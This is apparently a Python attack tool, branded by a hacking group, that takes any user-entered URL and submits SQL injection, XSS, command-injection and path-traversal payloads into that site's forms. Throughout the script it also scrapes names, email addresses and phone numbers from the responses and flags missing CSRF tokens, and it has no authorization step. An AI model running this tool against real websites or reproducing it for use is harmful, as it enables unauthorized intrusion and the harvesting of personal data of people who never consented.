import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import re

# Banner with ASCII logo
def print_banner():
    print(r"""
    ███████╗░██████╗░░██████╗░██╗░░░██╗██████╗░░█████╗░░█████╗░
    ██╔════╝██╔════╝░██╔════╝░╚██╗░██╔╝╚════██╗██╔══██╗██╔══██╗
    █████╗░░██║░░██╗░██║░░██╗░░╚████╔╝░░█████╔╝██║░░██║██║░░██║
    ██╔══╝░░██║░░╚██╗██║░░╚██╗░░╚██╔╝░░░╚═══██╗██║░░██║██║░░██║
    ███████╗╚██████╔╝╚██████╔╝░░░██║░░░██████╔╝╚█████╔╝╚█████╔╝
    ╚══════╝░╚═════╝░░╚═════╝░░░░╚═╝░░░╚═════╝░░╚════╝░░╚════╝░
    
                Made by ediop3Squad leader
    """)

# List of payloads for SQL Injection, XSS, RCE, and LFI
sql_injection_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' UNION SELECT database(), user(), version(); -- ",
    "' UNION SELECT table_name FROM information_schema.tables; -- ",
]

xss_payloads = [
    "<script>alert('XSS')</script>",
    "'\"><script>alert(1)</script>",
]

rce_payloads = [
    "; ls",
    "| whoami",
]

lfi_payloads = [
    "../../etc/passwd",
]

# Function to extract all forms from a webpage
def get_forms(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.content, "html.parser")
        return soup.find_all("form")
    except Exception as e:
        print(f"Error fetching forms: {e}")
        return []

# Function to submit form with a payload
def submit_form(form, url, payload):
    action = form.get("action")
    post_url = urljoin(url, action)
    method = form.get("method", "get").lower()

    inputs = form.find_all("input")
    data = {}
    for input in inputs:
        input_name = input.get("name")
        input_type = input.get("type", "text")
        input_value = input.get("value", "")
        if input_type == "text":
            input_value = payload  # Inject payload into text fields
        data[input_name] = input_value

    # Send HTTP request
    if method == "post":
        return requests.post(post_url, data=data)
    return requests.get(post_url, params=data)

# Function to extract useful information from response text
def extract_info(response_text):
    # Regex patterns for extracting names, emails, and phone numbers
    email_pattern = r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
    name_pattern = r"\b[A-Z][a-z]+ [A-Z][a-z]+\b"  # Simple pattern for names
    phone_pattern = r"\b\d{3}[-.\s]?\d{3}[-.\s]?\d{4}\b"

    emails = re.findall(email_pattern, response_text)
    names = re.findall(name_pattern, response_text)
    phones = re.findall(phone_pattern, response_text)

    return {
        "names": list(set(names)),
        "emails": list(set(emails)),
        "phones": list(set(phones))
    }

# Function to check for SQL Injection vulnerabilities and attempt to retrieve database info
def test_sql_injection(url):
    forms = get_forms(url)
    print(f"\n[+] Detected {len(forms)} forms on {url}")

    for form in forms:
        print(f"[+] Testing form for SQL Injection at {url}")
        for payload in sql_injection_payloads:
            response = submit_form(form, url, payload)
            if "SQL syntax" in response.text or "mysql_fetch" in response.text or "error" in response.text:
                print(f"[!] SQL Injection vulnerability detected with payload: {payload}")
                print(f"[!] Vulnerable page: {response.url}")

                # Extract potential information
                info = extract_info(response.text)

                # Display found information
                print("\n[!] Found Information:")
                if info["names"]:
                    print(f"Names: {', '.join(info['names'][:5])}")  # Display only first 5
                if info["emails"]:
                    print(f"Emails: {', '.join(info['emails'][:5])}")  # Display only first 5
                if info["phones"]:
                    print(f"Numbers: {', '.join(info['phones'][:5])}")  # Display only first 5
                
                return True
    return False

# Function to check for XSS vulnerabilities
def test_xss(url):
    forms = get_forms(url)
    print(f"\n[+] Detected {len(forms)} forms on {url}")

    for form in forms:
        print(f"[+] Testing form for XSS at {url}")
        for payload in xss_payloads:
            response = submit_form(form, url, payload)
            if payload in response.text:
                print(f"[!] XSS vulnerability detected with payload: {payload}")
                print(f"[!] Vulnerable page: {response.url}")

                # Extract potential information
                info = extract_info(response.text)

                # Display found information
                print("\n[!] Found Information:")
                if info["names"]:
                    print(f"Names: {', '.join(info['names'][:5])}")  # Display only first 5
                if info["emails"]:
                    print(f"Emails: {', '.join(info['emails'][:5])}")  # Display only first 5
                if info["phones"]:
                    print(f"Numbers: {', '.join(info['phones'][:5])}")  # Display only first 5

                return True
    return False

# Function to check for Remote Code Execution (RCE) vulnerabilities
def test_rce(url):
    forms = get_forms(url)
    print(f"\n[+] Detected {len(forms)} forms on {url}")

    for form in forms:
        print(f"[+] Testing form for Remote Code Execution at {url}")
        for payload in rce_payloads:
            response = submit_form(form, url, payload)
            if "root" in response.text or "/bin/" in response.text or "uid=" in response.text:
                print(f"[!] RCE vulnerability detected with payload: {payload}")
                print(f"[!] Vulnerable page: {response.url}")

                # Extract potential information
                info = extract_info(response.text)

                # Display found information
                print("\n[!] Found Information:")
                if info["names"]:
                    print(f"Names: {', '.join(info['names'][:5])}")  # Display only first 5
                if info["emails"]:
                    print(f"Emails: {', '.join(info['emails'][:5])}")  # Display only first 5
                if info["phones"]:
                    print(f"Numbers: {', '.join(info['phones'][:5])}")  # Display only first 5

                return True
    return False

# Function to check for Local File Inclusion (LFI) vulnerabilities
def test_lfi(url):
    forms = get_forms(url)
    print(f"\n[+] Detected {len(forms)} forms on {url}")

    for form in forms:
        print(f"[+] Testing form for Local File Inclusion at {url}")
        for payload in lfi_payloads:
            response = submit_form(form, url, payload)
            if "root:x" in response.text or "boot.ini" in response.text:
                print(f"[!] LFI vulnerability detected with payload: {payload}")
                print(f"[!] Vulnerable page: {response.url}")

                # Extract potential information
                info = extract_info(response.text)

                # Display found information
                print("\n[!] Found Information:")
                if info["names"]:
                    print(f"Names: {', '.join(info['names'][:5])}")  # Display only first 5
                if info["emails"]:
                    print(f"Emails: {', '.join(info['emails'][:5])}")  # Display only first 5
                if info["phones"]:
                    print(f"Numbers: {', '.join(info['phones'][:5])}")  # Display only first 5

                return True
    return False

# Function to check for CSRF vulnerabilities
def test_csrf(url):
    forms = get_forms(url)
    print(f"\n[+] Detected {len(forms)} forms on {url}")

    for form in forms:
        print(f"[+] Testing form for CSRF at {url}")
        if "csrf" not in form.text.lower():
            print(f"[!] CSRF vulnerability detected: No CSRF token found")
            print(f"[!] Vulnerable page: {url}")
            return True
    return False

# Main scanning function
def scan(url):
    print(f"[*] Scanning {url} for vulnerabilities...")

    # Check for SQL Injection
    if test_sql_injection(url):
        print(f"[+] SQL Injection vulnerability found on {url}")
    else:
        print(f"[-] No SQL Injection vulnerabilities found on {url}")

    # Check for XSS
    if test_xss(url):
        print(f"[+] XSS vulnerability found on {url}")
    else:
        print(f"[-] No XSS vulnerabilities found on {url}")

    # Check for Remote Code Execution
    if test_rce(url):
        print(f"[+] RCE vulnerability found on {url}")
    else:
        print(f"[-] No RCE vulnerabilities found on {url}")

    # Check for Local File Inclusion
    if test_lfi(url):
        print(f"[+] LFI vulnerability found on {url}")
    else:
        print(f"[-] No LFI vulnerabilities found on {url}")

    # Check for CSRF
    if test_csrf(url):
        print(f"[+] CSRF vulnerability found on {url}")
    else:
        print(f"[-] No CSRF vulnerabilities found on {url}")

if __name__ == "__main__":
    print_banner()
    target_url = input("Enter URL to scan: ")
    scan(target_url)
